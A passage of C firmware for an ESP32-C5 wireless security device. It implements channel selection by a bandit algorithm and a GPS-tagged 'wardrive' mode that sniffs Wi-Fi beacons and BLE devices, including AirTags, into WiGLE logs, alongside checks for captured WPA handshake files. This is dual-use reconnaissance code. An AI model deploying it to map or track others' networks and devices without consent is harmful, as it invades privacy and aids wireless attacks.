        return false; // Directory doesn't exist, so no files exist
    }
    
    struct dirent *entry;
    bool found = false;
    while ((entry = readdir(dir)) != NULL) {
        // Check if filename starts with the SSID and ends with .pcap
        if (strncmp(entry->d_name, ssid_safe, strlen(ssid_safe)) == 0 &&
            strstr(entry->d_name, ".pcap") != NULL) {
            found = true;
            break;
        }
    }
    
    closedir(dir);
    return found;
}

// Also check by BSSID (more reliable than SSID for hidden/duplicate networks)
static bool check_handshake_file_exists_by_bssid(const uint8_t *bssid) {
    char mac_suffix[7];
    snprintf(mac_suffix, sizeof(mac_suffix), "%02X%02X%02X", bssid[3], bssid[4], bssid[5]);
    
    DIR *dir = opendir("/sdcard/lab/handshakes");
    if (dir == NULL) return false;
    
    struct dirent *entry;
    bool found = false;
    while ((entry = readdir(dir)) != NULL) {
        if (strstr(entry->d_name, mac_suffix) != NULL &&
            strstr(entry->d_name, ".pcap") != NULL) {
            found = true;
            break;
        }
    }
    closedir(dir);
    return found;
}

// ============================================================================
// D-UCB (Discounted Upper Confidence Bound) Algorithm for Channel Selection
// ============================================================================

static void ducb_init(void) {
    ducb_channel_count = dual_band_channels_count;
    ducb_discounted_total = 0.0;
    for (int i = 0; i < ducb_channel_count; i++) {
        ducb_channels[i].channel = dual_band_channels[i];
        ducb_channels[i].discounted_reward = 0.0;
        ducb_channels[i].discounted_pulls = 0.0;
        ducb_channels[i].total_pulls = 0;
    }
}

// Apply discount to all channels (called before each selection)
static void ducb_apply_discount(void) {
    ducb_discounted_total *= DUCB_GAMMA;
    for (int i = 0; i < ducb_channel_count; i++) {
        ducb_channels[i].discounted_reward *= DUCB_GAMMA;
        ducb_channels[i].discounted_pulls *= DUCB_GAMMA;
    }
}

// Select best channel using D-UCB formula
static int ducb_select_channel(void) {
    ducb_apply_discount();
    
    int best_idx = 0;
    double best_ucb = -1.0;
    
    for (int i = 0; i < ducb_channel_count; i++) {
        // Forced exploration: unpulled channels have infinite UCB
        if (ducb_channels[i].discounted_pulls < 0.001) {
            // Find first unpulled channel
            best_idx = i;
            best_ucb = 1e18;
            break;
        }
        
        double avg_reward = ducb_channels[i].discounted_reward / ducb_channels[i].discounted_pulls;
        double exploration = DUCB_C * sqrt(log(ducb_discounted_total + 1.0) / ducb_channels[i].discounted_pulls);
        double ucb = avg_reward + exploration;
        
        if (ucb > best_ucb) {
            best_ucb = ucb;
            best_idx = i;
        }
    }
    
    return best_idx;
}

// Update D-UCB after observing reward on a channel
static void ducb_update(int channel_idx, double reward) {
    ducb_channels[channel_idx].discounted_pulls += 1.0;
    ducb_channels[channel_idx].discounted_reward += reward;
    ducb_channels[channel_idx].total_pulls++;
    ducb_discounted_total += 1.0;
}

// ============================================================================
// Wardrive Promisc: D-UCB, Dedup, Promiscuous Callback, Task
// ============================================================================

static void wdp_ducb_init(void) {
    wdp_ducb_channel_count = 0;
    wdp_ducb_discounted_total = 0.0;

    for (int i = 0; i < (int)WDP_CH_24_PRIMARY_COUNT; i++) {
        wdp_ducb_channels[wdp_ducb_channel_count].channel = wdp_ch_24_primary[i];
        wdp_ducb_channels[wdp_ducb_channel_count].tier = WDP_TIER_24_PRIMARY;
        wdp_ducb_channels[wdp_ducb_channel_count].discounted_reward = 0.5;
        wdp_ducb_channels[wdp_ducb_channel_count].discounted_pulls = 0.0;
        wdp_ducb_channels[wdp_ducb_channel_count].total_pulls = 0;
        wdp_ducb_channel_count++;
    }
    for (int i = 0; i < (int)WDP_CH_24_SECONDARY_COUNT; i++) {
        wdp_ducb_channels[wdp_ducb_channel_count].channel = wdp_ch_24_secondary[i];
        wdp_ducb_channels[wdp_ducb_channel_count].tier = WDP_TIER_24_SECONDARY;
        wdp_ducb_channels[wdp_ducb_channel_count].discounted_reward = 0.0;
        wdp_ducb_channels[wdp_ducb_channel_count].discounted_pulls = 0.0;
        wdp_ducb_channels[wdp_ducb_channel_count].total_pulls = 0;
        wdp_ducb_channel_count++;
    }
    for (int i = 0; i < (int)WDP_CH_5_NON_DFS_COUNT; i++) {
        wdp_ducb_channels[wdp_ducb_channel_count].channel = wdp_ch_5_non_dfs[i];
        wdp_ducb_channels[wdp_ducb_channel_count].tier = WDP_TIER_5_NON_DFS;
        wdp_ducb_channels[wdp_ducb_channel_count].discounted_reward = 0.0;
        wdp_ducb_channels[wdp_ducb_channel_count].discounted_pulls = 0.0;
        wdp_ducb_channels[wdp_ducb_channel_count].total_pulls = 0;
        wdp_ducb_channel_count++;
    }
    for (int i = 0; i < (int)WDP_CH_5_DFS_COUNT; i++) {
        wdp_ducb_channels[wdp_ducb_channel_count].channel = wdp_ch_5_dfs[i];
        wdp_ducb_channels[wdp_ducb_channel_count].tier = WDP_TIER_5_DFS;
        wdp_ducb_channels[wdp_ducb_channel_count].discounted_reward = 0.0;
        wdp_ducb_channels[wdp_ducb_channel_count].discounted_pulls = 0.0;
        wdp_ducb_channels[wdp_ducb_channel_count].total_pulls = 0;
        wdp_ducb_channel_count++;
    }
}

static int wdp_ducb_select_channel(void) {
    wdp_ducb_discounted_total *= WDP_DUCB_GAMMA;
    for (int i = 0; i < wdp_ducb_channel_count; i++) {
        wdp_ducb_channels[i].discounted_reward *= WDP_DUCB_GAMMA;
        wdp_ducb_channels[i].discounted_pulls *= WDP_DUCB_GAMMA;
    }

    int best_idx = 0;
    double best_ucb = -1.0;

    for (int i = 0; i < wdp_ducb_channel_count; i++) {
        if (wdp_ducb_channels[i].discounted_pulls < 0.001) {
            best_idx = i;
            break;
        }
        double avg_reward = wdp_ducb_channels[i].discounted_reward / wdp_ducb_channels[i].discounted_pulls;
        double exploration = WDP_DUCB_C * sqrt(log(wdp_ducb_discounted_total + 1.0) / wdp_ducb_channels[i].discounted_pulls);
        double ucb = avg_reward + exploration;
        if (ucb > best_ucb) {
            best_ucb = ucb;
            best_idx = i;
        }
    }
    return best_idx;
}

static void wdp_ducb_update(int channel_idx, double reward) {
    wdp_ducb_channels[channel_idx].discounted_pulls += 1.0;
    wdp_ducb_channels[channel_idx].discounted_reward += reward;
    wdp_ducb_channels[channel_idx].total_pulls++;
    wdp_ducb_discounted_total += 1.0;
}

static int wdp_get_dwell_ms(wdp_channel_tier_t tier) {
    switch (tier) {
        case WDP_TIER_24_PRIMARY:   return WDP_DWELL_PRIMARY_MS;
        case WDP_TIER_24_SECONDARY: return WDP_DWELL_DEFAULT_MS;
        case WDP_TIER_5_NON_DFS:    return WDP_DWELL_DEFAULT_MS;
        case WDP_TIER_5_DFS:        return WDP_DWELL_DFS_MS;
        default:                    return WDP_DWELL_DEFAULT_MS;
    }
}

static int wdp_find_bssid(const uint8_t *bssid) {
    for (int i = 0; i < wdp_seen_count; i++) {
        if (memcmp(wdp_seen_networks[i].bssid, bssid, 6) == 0) {
            return i;
        }
    }
    return -1;
}

static void wdp_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!wardrive_promisc_active) return;
    if (type != WIFI_PKT_MGMT) return;

    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    if (len < 36) return;

    uint8_t frame_type = frame[0] & 0xFC;
    if (frame_type != 0x80) return; // Only beacons

    const uint8_t *ap_bssid = &frame[10]; // addr2 = transmitter = AP

    const uint8_t *body = frame + 24 + 12;
    int body_len = len - 24 - 12;
    if (body_len < 2) return;

    char ssid[33] = {0};
    uint8_t beacon_channel = pkt->rx_ctrl.channel;
    wifi_auth_mode_t authmode = WIFI_AUTH_OPEN;

    int offset = 0;
    while (offset + 2 <= body_len) {
        uint8_t tag = body[offset];
        uint8_t tag_len = body[offset + 1];
        if (offset + 2 + tag_len > body_len) break;

        if (tag == 0 && tag_len > 0 && tag_len <= 32) {
            memcpy(ssid, &body[offset + 2], tag_len);
            ssid[tag_len] = '\0';
        } else if (tag == 3 && tag_len == 1) {
            beacon_channel = body[offset + 2];
        } else if (tag == 48) {
            authmode = WIFI_AUTH_WPA2_PSK;
        } else if (tag == 221) {
            if (tag_len >= 4 && body[offset+2] == 0x00 && body[offset+3] == 0x50 &&
                body[offset+4] == 0xF2 && body[offset+5] == 0x01) {
                if (authmode == WIFI_AUTH_OPEN) authmode = WIFI_AUTH_WPA_PSK;
            }
        }
        offset += 2 + tag_len;
    }

    int existing = wdp_find_bssid(ap_bssid);
    if (existing >= 0) {
        if (pkt->rx_ctrl.rssi > wdp_seen_networks[existing].rssi) {
            wdp_seen_networks[existing].rssi = (int8_t)pkt->rx_ctrl.rssi;
        }
        return;
    }

    if (wdp_seen_count >= wdp_seen_capacity) {
        wdp_needs_grow = true;
        return;
    }

    int idx = wdp_seen_count;
    memcpy(wdp_seen_networks[idx].bssid, ap_bssid, 6);
    strncpy(wdp_seen_networks[idx].ssid, ssid, 32);
    wdp_seen_networks[idx].ssid[32] = '\0';
    wdp_seen_networks[idx].channel = beacon_channel;
    wdp_seen_networks[idx].rssi = (int8_t)pkt->rx_ctrl.rssi;
    wdp_seen_networks[idx].authmode = authmode;
    wdp_seen_networks[idx].written_to_file = false;
    wdp_seen_count++;

    wdp_dwell_new_networks++;

    char mac_str[18];
    snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             ap_bssid[0], ap_bssid[1], ap_bssid[2],
             ap_bssid[3], ap_bssid[4], ap_bssid[5]);

    char escaped_ssid[64];
    escape_csv_field(ssid, escaped_ssid, sizeof(escaped_ssid));

    const char *auth_str = get_auth_mode_wiggle(authmode);

    char timestamp[32];
    get_timestamp_string(timestamp, sizeof(timestamp));

    if (current_gps.valid) {
        printf("%s,%s,[%s],%s,%d,%d,%.7f,%.7f,%.2f,%.2f,WIFI\n",
               mac_str, escaped_ssid, auth_str, timestamp,
               beacon_channel, (int)pkt->rx_ctrl.rssi,
               current_gps.latitude, current_gps.longitude,
               current_gps.altitude, current_gps.accuracy);
    } else {
        printf("%s,%s,[%s],%s,%d,%d,0.0000000,0.0000000,0.00,0.00,WIFI\n",
               mac_str, escaped_ssid, auth_str, timestamp,
               beacon_channel, (int)pkt->rx_ctrl.rssi);
    }
}

static bool wdp_grow_network_buffer(void) {
    int new_capacity = wdp_seen_capacity * 2;
    size_t new_size = (size_t)new_capacity * sizeof(wdp_network_t);
    size_t free_psram = heap_caps_get_free_size(MALLOC_CAP_SPIRAM);

    if (free_psram < new_size + WDP_PSRAM_RESERVE_BYTES) {
        MY_LOG_INFO(TAG, "Cannot grow wardrive buffer: only %u bytes free PSRAM (need %u + %u reserve)",
                    (unsigned)free_psram, (unsigned)new_size, (unsigned)WDP_PSRAM_RESERVE_BYTES);
        return false;
    }

    wdp_network_t *new_buf = heap_caps_realloc(wdp_seen_networks, new_size, MALLOC_CAP_SPIRAM);
    if (!new_buf) {
        MY_LOG_INFO(TAG, "Failed to realloc wardrive buffer to %d entries", new_capacity);
        return false;
    }

    memset(&new_buf[wdp_seen_capacity], 0, (size_t)(new_capacity - wdp_seen_capacity) * sizeof(wdp_network_t));
    wdp_seen_networks = new_buf;
    wdp_seen_capacity = new_capacity;
    wdp_needs_grow = false;

    MY_LOG_INFO(TAG, "Wardrive buffer grown to %d entries (%.1f KB PSRAM)",
                new_capacity, (float)new_size / 1024.0f);
    return true;
}

static void wardrive_promisc_task(void *pvParameters) {
    (void)pvParameters;

    MY_LOG_INFO(TAG, "Wardrive promisc task started.");
    const bool external_feed = gps_module_uses_external_feed(current_gps_module);

    esp_err_t led_err = led_set_color(255, 0, 255); // Magenta
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for wardrive promisc: %s", esp_err_to_name(led_err));
    }

    int file_number = find_next_wardrive_file_number();
    MY_LOG_INFO(TAG, "Next wardrive file will be: w%d.log", file_number);
    double wdp_total_distance_m = 0.0;
    double wdp_last_trace_lat = 0.0;
    double wdp_last_trace_lon = 0.0;
    bool wdp_has_trace_point = false;

    if (wardrive_promisc_trace_enabled) {
        snprintf(wardrive_promisc_trace_path, sizeof(wardrive_promisc_trace_path),
                 "/sdcard/lab/wardrives/w%d_track.kml", file_number);
    } else {
        wardrive_promisc_trace_path[0] = '\0';
    }

    MY_LOG_INFO(TAG, "Waiting for GPS fix (no timeout - use 'stop' to cancel)...");
    oled_display_update_full("> Wardrive Pro", "  Waiting GPS...", "  No timeout", "  Use 'stop'");
    if (!wait_for_gps_fix(0)) {
        MY_LOG_INFO(TAG, "Warning: No GPS fix obtained, not continuing without GPS data - please ensure clear view of the sky and try again.");
        oled_display_update_full("> Wardrive Pro", "  No GPS fix!", "  Stopping...", "");
        goto cleanup;
    }
    MY_LOG_INFO(TAG, "GPS fix obtained: Lat=%.7f Lon=%.7f",
                current_gps.latitude, current_gps.longitude);
    oled_display_update_full("> Wardrive Pro", "  GPS fix OK!", "  D-UCB scanning", "");

    if (wardrive_promisc_trace_enabled) {
        if (wardrive_trace_init_file(wardrive_promisc_trace_path)) {
            wardrive_trace_append_point(wardrive_promisc_trace_path,
                                        current_gps.latitude,
                                        current_gps.longitude,
                                        current_gps.altitude);
            wdp_last_trace_lat = current_gps.latitude;
            wdp_last_trace_lon = current_gps.longitude;
            wdp_has_trace_point = true;
            MY_LOG_INFO(TAG, "Wardrive trace enabled: %s", wardrive_promisc_trace_path);
        } else {
            MY_LOG_INFO(TAG, "Failed to create wardrive trace file: %s", wardrive_promisc_trace_path);
            wardrive_promisc_trace_enabled = false;
            wardrive_promisc_trace_path[0] = '\0';
        }
    }

    wdp_seen_count = 0;
    wdp_dwell_new_networks = 0;
    wdp_needs_grow = false;
    memset(wdp_seen_networks, 0, (size_t)wdp_seen_capacity * sizeof(wdp_network_t));
    wdp_ducb_init();

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(wdp_promiscuous_cb);
    esp_wifi_set_promiscuous(true);

    MY_LOG_INFO(TAG, "Promiscuous wardrive started. Channels: %d (2.4 primary: %d, secondary: %d, 5GHz: %d, DFS: %d)",
                wdp_ducb_channel_count,
                (int)WDP_CH_24_PRIMARY_COUNT, (int)WDP_CH_24_SECONDARY_COUNT,
                (int)WDP_CH_5_NON_DFS_COUNT, (int)WDP_CH_5_DFS_COUNT);
    MY_LOG_INFO(TAG, "Use 'stop' command to stop.");

    // Start BLE scanning in background (coexistence handled by ESP-IDF)
    bt_reset_counters();
    bool wdp_bt_enabled = nimble_initialized;
    bool wdp_bt_running = false;
    if (wdp_bt_enabled) {
        wdp_bt_running = (bt_start_scan_coex() == 0);
    }
    int wdp_bt_flush_count = 0;
    if (wdp_bt_running) {
        MY_LOG_INFO(TAG, "BLE scan started alongside WiFi promiscuous capture.");
    } else {
        MY_LOG_INFO(TAG, "BLE scan unavailable, logging WiFi only.");
        wdp_bt_enabled = false;
    }

    int64_t last_stats_time = esp_timer_get_time();
    int last_flush_count = 0;
    int gps_fix_lost_count = 0;
    #define WDP_GPS_FIX_LOST_THRESHOLD 3

    while (wardrive_promisc_active && !operation_stop_requested) {
        if (external_feed) {
            gps_sync_from_selected_external_source();
        }
        if (external_feed && !current_gps.valid) {
            MY_LOG_INFO(TAG, "GPS fix lost! Pausing wardrive...");
            oled_display_update_full("> Wardrive Pro", "  GPS fix lost!", "  Pausing...", "");
            esp_wifi_set_promiscuous(false);
            if (wdp_bt_running) {
                bt_stop_scan();
                wdp_bt_running = false;
            }
            while (!current_gps.valid && wardrive_promisc_active && !operation_stop_requested) {
                gps_sync_from_selected_external_source();
                vTaskDelay(pdMS_TO_TICKS(200));
            }
            if (!wardrive_promisc_active || operation_stop_requested) break;
            MY_LOG_INFO(TAG, "GPS fix recovered: Lat=%.7f Lon=%.7f. Resuming wardrive.",
                        current_gps.latitude, current_gps.longitude);
            oled_display_update_full("> Wardrive Pro", "  GPS recovered!", "  Resuming...", "");
            esp_wifi_set_promiscuous(true);
            if (wdp_bt_enabled) {
                wdp_bt_running = (bt_start_scan_coex() == 0);
                if (!wdp_bt_running) {
                    MY_LOG_INFO(TAG, "Failed to resume BLE scan after GPS recovery.");
                }
            }
        }

        int ch_idx = wdp_ducb_select_channel();
        int channel = wdp_ducb_channels[ch_idx].channel;
        int dwell_ms = wdp_get_dwell_ms(wdp_ducb_channels[ch_idx].tier);

        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        
        {
            static int64_t wdp_oled_last_us = 0;
            int64_t wdp_now_us = esp_timer_get_time();
            if (wdp_now_us - wdp_oled_last_us > 2000000) {
                wdp_oled_last_us = wdp_now_us;
                char wdp_l2[64], wdp_l3[64], wdp_l4[64];
                snprintf(wdp_l2, sizeof(wdp_l2), "  Ch %d  D-UCB", channel);
                snprintf(wdp_l3, sizeof(wdp_l3), "  %d networks", wdp_seen_count);
                snprintf(wdp_l4, sizeof(wdp_l4), "  GPS:%s SAT:%d",
                         current_gps.valid ? "OK" : "LOST", current_gps.satellites);
                oled_display_update_full("> Wardrive Pro", wdp_l2, wdp_l3, wdp_l4);
            }
        }

        wdp_dwell_new_networks = 0;

        vTaskDelay(pdMS_TO_TICKS(dwell_ms));

        if (!wardrive_promisc_active || operation_stop_requested) break;

        // Grow network buffer if needed (safe: promiscuous disabled during realloc)
        if (wdp_needs_grow) {
            esp_wifi_set_promiscuous(false);
            if (wdp_grow_network_buffer()) {
                MY_LOG_INFO(TAG, "Network buffer expanded, capacity now %d", wdp_seen_capacity);
            } else {
                MY_LOG_INFO(TAG, "Network buffer growth failed, continuing with %d/%d",
                            wdp_seen_count, wdp_seen_capacity);
                wdp_needs_grow = false;
            }
            esp_wifi_set_promiscuous(true);
        }

        // Read GPS source
        int gps_len = 0;
        if (!external_feed) {
            gps_len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(10));
            if (gps_len > 0) {
                wardrive_gps_buffer[gps_len] = '\0';
                char *line = strtok(wardrive_gps_buffer, "\r\n");
                while (line != NULL) {
                    parse_gps_nmea(line);
                    line = strtok(NULL, "\r\n");
                }
            }
        }

        if (!current_gps.valid) {
            gps_fix_lost_count++;
        } else {
            gps_fix_lost_count = 0;
            if (wardrive_promisc_trace_enabled) {
                if (!wdp_has_trace_point) {
                    if (wardrive_trace_append_point(wardrive_promisc_trace_path,
                                                    current_gps.latitude,
                                                    current_gps.longitude,
                                                    current_gps.altitude)) {
                        wdp_last_trace_lat = current_gps.latitude;
                        wdp_last_trace_lon = current_gps.longitude;
                        wdp_has_trace_point = true;
                    }
                } else {
                    double step_m = gps_distance_meters(wdp_last_trace_lat, wdp_last_trace_lon,
                                                        current_gps.latitude, current_gps.longitude);
                    if (step_m >= 3.0) {
                        if (wardrive_trace_append_point(wardrive_promisc_trace_path,
                                                        current_gps.latitude,
                                                        current_gps.longitude,
                                                        current_gps.altitude)) {
                            wdp_total_distance_m += step_m;
                            wdp_last_trace_lat = current_gps.latitude;
                            wdp_last_trace_lon = current_gps.longitude;
                        }
                    }
                }
            }
        }

        if (gps_fix_lost_count >= WDP_GPS_FIX_LOST_THRESHOLD) {
            MY_LOG_INFO(TAG, "GPS fix lost for %d cycles! Pausing wardrive...", gps_fix_lost_count);
            esp_wifi_set_promiscuous(false);
            if (wdp_bt_running) {
                bt_stop_scan();
                wdp_bt_running = false;
            }

            while (!current_gps.valid && wardrive_promisc_active && !operation_stop_requested) {
                if (external_feed) {
                    gps_sync_from_selected_external_source();
                    vTaskDelay(pdMS_TO_TICKS(200));
                } else {
                    gps_len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer,
                                              GPS_BUF_SIZE - 1, pdMS_TO_TICKS(1000));
                    if (gps_len > 0) {
                        wardrive_gps_buffer[gps_len] = '\0';
                        char *line = strtok(wardrive_gps_buffer, "\r\n");
                        while (line != NULL) {
                            parse_gps_nmea(line);
                            line = strtok(NULL, "\r\n");
                        }
                    }
                }
            }

            if (!wardrive_promisc_active || operation_stop_requested) break;

            MY_LOG_INFO(TAG, "GPS fix recovered: Lat=%.7f Lon=%.7f. Resuming wardrive.",
                        current_gps.latitude, current_gps.longitude);
            esp_wifi_set_promiscuous(true);
            if (wdp_bt_enabled) {
                wdp_bt_running = (bt_start_scan_coex() == 0);
                if (!wdp_bt_running) {
                    MY_LOG_INFO(TAG, "Failed to resume BLE scan after GPS recovery.");
                }
            }
            gps_fix_lost_count = 0;
        }

        double reward = (double)wdp_dwell_new_networks;
        wdp_ducb_update(ch_idx, reward);

        // Flush new entries to SD file periodically
        int current_count = wdp_seen_count;
        int bt_pending = wdp_bt_enabled ? (bt_device_count - wdp_bt_flush_count) : 0;
        bool bt_flush_due = wdp_bt_enabled && bt_pending > 0 &&
                            ((esp_timer_get_time() - last_stats_time) >= WDP_STATS_INTERVAL_US);
        if ((current_count - last_flush_count) >= WDP_FILE_FLUSH_INTERVAL ||
            ((current_count > last_flush_count) && ((esp_timer_get_time() - last_stats_time) >= WDP_STATS_INTERVAL_US)) ||
            bt_flush_due) {

            char filename[64];
            snprintf(filename, sizeof(filename), "/sdcard/lab/wardrives/w%d.log", file_number);

            struct stat st;
            if (stat("/sdcard/lab/wardrives", &st) != 0) {
                MY_LOG_INFO(TAG, "Error: /sdcard/lab/wardrives directory not accessible");
            } else {
                FILE *file = fopen(filename, "a");
                if (!file) file = fopen(filename, "w");
                if (file) {
                    fseek(file, 0, SEEK_END);
                    if (ftell(file) == 0) {
                        fprintf(file, "WigleWifi-1.6,appRelease=v1.1,model=MonsterC5,release=v1.0,device=MonsterC5,display=SPI TFT,board=ESP32C5,brand=LAB5\n");
                        fprintf(file, "MAC,SSID,AuthMode,FirstSeen,Channel,Frequency,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,RCOIs,MfgrId,Type\n");
                    }

                    char timestamp[32];
                    get_timestamp_string(timestamp, sizeof(timestamp));

                    for (int i = 0; i < current_count; i++) {
                        if (wdp_seen_networks[i].written_to_file) continue;

                        char mac_str[18];
                        snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                                 wdp_seen_networks[i].bssid[0], wdp_seen_networks[i].bssid[1],
                                 wdp_seen_networks[i].bssid[2], wdp_seen_networks[i].bssid[3],
                                 wdp_seen_networks[i].bssid[4], wdp_seen_networks[i].bssid[5]);

                        char escaped_ssid[64];
                        escape_csv_field(wdp_seen_networks[i].ssid, escaped_ssid, sizeof(escaped_ssid));

                        const char *auth_str = get_auth_mode_wiggle(wdp_seen_networks[i].authmode);
                        int wifi_freq_mhz = wigle_wifi_channel_to_frequency_mhz(wdp_seen_networks[i].channel);

                        if (current_gps.valid) {
                            fprintf(file, "%s,%s,[%s],%s,%d,%d,%d,%.7f,%.7f,%.2f,%.2f,,,WIFI\n",
                                    mac_str, escaped_ssid, auth_str, timestamp,
                                    wdp_seen_networks[i].channel, wifi_freq_mhz, (int)wdp_seen_networks[i].rssi,
                                    current_gps.latitude, current_gps.longitude,
                                    current_gps.altitude, current_gps.accuracy);
                        } else {
                            fprintf(file, "%s,%s,[%s],%s,%d,%d,%d,0.0000000,0.0000000,0.00,0.00,,,WIFI\n",
                                    mac_str, escaped_ssid, auth_str, timestamp,
                                    wdp_seen_networks[i].channel, wifi_freq_mhz, (int)wdp_seen_networks[i].rssi);
                        }
                        wdp_seen_networks[i].written_to_file = true;
                    }

                    // Flush BT devices collected since last flush
                    if (wdp_bt_enabled) {
                        int bt_total = bt_device_count;
                        for (int i = wdp_bt_flush_count; i < bt_total; i++) {
                            char bt_mac[18];
                            char escaped_bt_name[64];
                            char bt_mfgr_id[8];
                            bt_format_addr(bt_devices[i].addr, bt_mac);
                            escape_csv_field(bt_devices[i].name, escaped_bt_name, sizeof(escaped_bt_name));
                            if (bt_devices[i].company_id != 0) {
                                snprintf(bt_mfgr_id, sizeof(bt_mfgr_id), "%u", bt_devices[i].company_id);
                            } else {
                                bt_mfgr_id[0] = '\0';
                            }
                            const char *bt_cap = bt_devices[i].is_airtag  ? "AirTag [LE]"  :
                                                 bt_devices[i].is_smarttag ? "SmartTag [LE]" : "Misc [LE]";
                            if (current_gps.valid) {
                                fprintf(file, "%s,%s,%s,%s,0,,%d,%.7f,%.7f,%.2f,%.2f,,%s,BLE\n",
                                        bt_mac, escaped_bt_name, bt_cap, timestamp,
                                        (int)bt_devices[i].rssi,
                                        current_gps.latitude, current_gps.longitude,
                                        current_gps.altitude, current_gps.accuracy, bt_mfgr_id);
                                printf("%s,%s,%s,%s,0,,%d,%.7f,%.7f,%.2f,%.2f,,%s,BLE\n",
                                       bt_mac, escaped_bt_name, bt_cap, timestamp,
                                       (int)bt_devices[i].rssi,
                                       current_gps.latitude, current_gps.longitude,
                                       current_gps.altitude, current_gps.accuracy, bt_mfgr_id);
                            } else {
                                fprintf(file, "%s,%s,%s,%s,0,,%d,0.0000000,0.0000000,0.00,0.00,,%s,BLE\n",
                                        bt_mac, escaped_bt_name, bt_cap, timestamp,
                                        (int)bt_devices[i].rssi, bt_mfgr_id);
                                printf("%s,%s,%s,%s,0,,%d,0.0000000,0.0000000,0.00,0.00,,%s,BLE\n",
                                       bt_mac, escaped_bt_name, bt_cap, timestamp,
                                       (int)bt_devices[i].rssi, bt_mfgr_id);
                            }
                        }
                        wdp_bt_flush_count = bt_total;
                    }

                    fclose(file);
                    sd_sync();
                    last_flush_count = current_count;
                    MY_LOG_INFO(TAG, "Flushed %d networks + %d BT devices to %s",
                                current_count, wdp_bt_flush_count, filename);
                    {
                        char wdp_fl3[64];
                        snprintf(wdp_fl3, sizeof(wdp_fl3), "  %d nets %d BT", current_count, wdp_bt_flush_count);
                        oled_display_update_full("> Wardrive Pro", "  Flushed to SD", wdp_fl3, "  D-UCB active");
                    }
                }
            }
        }

        // Periodic stats
        int64_t now = esp_timer_get_time();
        if ((now - last_stats_time) >= WDP_STATS_INTERVAL_US) {
            int top_ch = 0, top_pulls = 0;
            for (int i = 0; i < wdp_ducb_channel_count; i++) {
                if (wdp_ducb_channels[i].total_pulls > top_pulls) {
                    top_pulls = wdp_ducb_channels[i].total_pulls;
                    top_ch = wdp_ducb_channels[i].channel;
                }
            }
            MY_LOG_INFO(TAG, "Wardrive promisc: %d unique networks, %d BT devices, D-UCB best ch: %d (%d visits), GPS: %s, sats: %d, dist: %.1fm",
                        wdp_seen_count, bt_device_count, top_ch, top_pulls,
                        current_gps.valid ? "valid" : "no fix",
                        current_gps.satellites, wdp_total_distance_m);
            last_stats_time = now;
        }
    }

    esp_wifi_set_promiscuous(false);

    // Stop BLE scan if it was started
    if (wdp_bt_running) {
        bt_stop_scan();
        MY_LOG_INFO(TAG, "BLE scan stopped. Total BT devices seen: %d", bt_device_count);
    }

cleanup:
    if (wardrive_promisc_trace_path[0] != '\0') {
        wardrive_trace_finalize_file(wardrive_promisc_trace_path);
        MY_LOG_INFO(TAG, "Wardrive trace saved to %s (distance %.1fm)", wardrive_promisc_trace_path, wdp_total_distance_m);
        wardrive_promisc_trace_path[0] = '\0';
    }
    led_err = led_set_idle();
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to restore idle LED after wardrive promisc: %s", esp_err_to_name(led_err));
    }

    MY_LOG_INFO(TAG, "Wardrive promisc stopped. Total unique networks: %d, BT devices: %d, distance: %.1fm",
                wdp_seen_count, bt_device_count, wdp_total_distance_m);
    wardrive_promisc_active = false;
    wardrive_promisc_task_handle = NULL;
    vTaskDelete(NULL);
}

static int cmd_start_wardrive_promisc_impl(int argc, char **argv, bool trace_enabled) {
    (void)argc; (void)argv;
    wardrive_promisc_trace_enabled = trace_enabled;
    oled_display_update_full("> Wardrive Pro", "  Promiscuous", "  GPS + SD log", "  Active...");
    log_memory_info("start_wardrive_promisc");

    if (!ensure_wifi_mode()) {
        return 1;
    }

    if (wardrive_promisc_active || wardrive_promisc_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Wardrive promisc already running. Use 'stop' to stop it first.");
        return 1;
    }
    if (wardrive_active || wardrive_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Cannot start wardrive promisc while regular wardrive is running. Use 'stop' first.");
        return 1;
    }
    if (handshake_attack_active || handshake_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Cannot start wardrive promisc while handshake attack is running. Use 'stop' first.");
        return 1;
    }
    if (gps_raw_active || gps_raw_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Cannot start wardrive promisc while GPS raw reader is running. Use 'stop' first.");
        return 1;
    }
    if (bt_scan_active || bt_airtag_scan_active || bt_scan_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Cannot start wardrive promisc while BT scan is running. Use 'stop' first.");
        return 1;
    }

    operation_stop_requested = false;

    MY_LOG_INFO(TAG, "Starting promiscuous wardrive mode...");

    // Initialize NimBLE for BT scanning (idempotent if already initialized)
    esp_err_t bt_ret = bt_nimble_init();
    if (bt_ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Warning: BLE init failed (%s) - wardrive will run without BT logging", esp_err_to_name(bt_ret));
    }

    const bool external_feed = gps_module_uses_external_feed(current_gps_module);

    esp_err_t ret = ESP_OK;
    if (!external_feed) {
        int baud = gps_get_baud_for_module(current_gps_module);
        ret = init_gps_uart(baud);
        if (ret != ESP_OK) {
            MY_LOG_INFO(TAG, "Failed to initialize GPS UART: %s", esp_err_to_name(ret));
            return 1;
        }
        MY_LOG_INFO(TAG, "GPS UART initialized on pins %d (TX) and %d (RX) at %d baud",
                    GPS_TX_PIN, GPS_RX_PIN, baud);
    } else {
        MY_LOG_INFO(TAG, "Using external GPS feed. Provide fixes via '%s'.",
                    gps_external_position_command_name(current_gps_module));
    }

    ret = init_sd_card();
